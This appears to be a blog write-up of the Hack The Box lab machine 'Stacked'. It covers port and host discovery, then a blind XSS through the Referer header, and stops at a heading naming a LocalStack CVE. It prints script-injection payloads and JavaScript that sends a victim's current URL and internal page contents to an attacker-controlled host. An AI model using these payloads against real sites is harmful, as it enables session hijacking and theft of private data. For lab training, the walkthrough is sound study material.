---
title: htb stacked
author: Yuchao
date: 2022-03-29 11:33:00 +0800
categories: [sec]
tags: [htb, aws, localstack]
math: true
mermaid: true
---

## recon

#### nmap
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
```
- 22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp open  docker

#### feroxbuster, directory discovery
``` feroxbuster -u http://stacked.htb ```

#### wfuzz, host discovery
``` wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26```
- hide word length 26 responses
- find host: portfolio.stacked.htb - TCP 80
- a local stack development page.
- <https://github.com/localstack/localstack>
- serverless: run services often used for Serverless apps (iam, lambda, dynamodb, apigateway, s3, sns)

## XSS

#### recon for XSS
- input area, and interesting headers.
- add payload as ``` <img src="http://{attackerIP}/fieldname_or_header_name"> ``` in different places.
- send the request.
attacker machine
``` sudo python3 -m http.server 80 ```
- 80 as we did not specify port in set payload
- wait a while
- ``` "GET /referer HTTP/1.1" 404 - ```
- so the ONLY field vulnerable to XSS is: Header -> referer.
- - run ``` date ``` two times, culculate the XSS victim(background cron) activity interval.
- interesting material below.
- <https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/>

#### find out what the URL the victim is looking at.
- Burpsuite set header Referer: <script src="http://{attackerIP}/pwn.js"></script>
- ``` python3 -m http.server 80 ``` at pwn.js location, for victime to run pwn.js.
- use nc to accept the victim`s response.

xmlhttprequest:
- like background web request by browser.
```javascript
XMLHttpRequest.open(method, url, async)
// if async = false, the script itself will not go foward, until the response. Otherwise, we will get null.
XMLHttpRequest.send(body)
// body: Optional, A body of data to be sent in the XHR request.
```

Method 1:(lucky there is a referer header)
```javascript 
<script src="http://10.10.14.6/xss.js"></script> 
```
- in the victim`s referer, we can see the response is from: "/read-mail.php?id=5"

Method 2: (more generic)
```javascript
var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://{attackerIP}/" + document.location, false);    
exfilreq.send(); 
```
- set above script as pwn.js
- when we nc at 80, can see the victim`s current page appended.
- in nc, we get "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1"
- For victim visited "http://{attackerIP}/http://mail.stacked.htb/read-mail.php?id=2"

This step we find out the inner email host name. (mail.stacked.htb)

#### Let victim visit inner pages for us.

```javascript
// Make target to visit the target
var target = "{the address we want victim to visit}"
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send()
var response=req1.responseText;
// Send what victim saw back to us
var req2 = new XMLHttpRequest();
req2.open('POST', "http://{attackerIP}:8000/", false)
req2.send(response);
```


## LocalStack vulnerability

#### CVE-2021-32090 
